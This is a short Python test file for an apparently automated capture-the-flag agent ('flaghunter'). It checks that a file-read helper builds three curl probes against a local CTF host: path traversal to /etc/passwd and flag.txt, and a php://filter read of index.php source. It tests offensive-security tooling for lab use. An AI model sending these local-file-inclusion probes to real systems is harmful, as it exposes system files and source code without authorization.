"""Tests for file-read/LFI chain extraction."""

from __future__ import annotations

import importlib
import importlib.util


def test_lfi_chain_mixin_builds_existing_probe_commands():
    spec = importlib.util.find_spec("flaghunter.agents.pa_agent.chains.file_read")
    assert spec is not None
    module = importlib.import_module("flaghunter.agents.pa_agent.chains.file_read")
    LFIChainMixin = module.LFIChainMixin
    target = "http://ctf.local/view"

    commands = LFIChainMixin._lfi_probe_commands(target)

    assert commands == [
        'curl -s "http://ctf.local/view?file=../../../etc/passwd"',
        'curl -s "http://ctf.local/view?file=../../../flag.txt"',
        'curl -s "http://ctf.local/view?file=php://filter/convert.base64-encode/resource=index.php"',
    ]
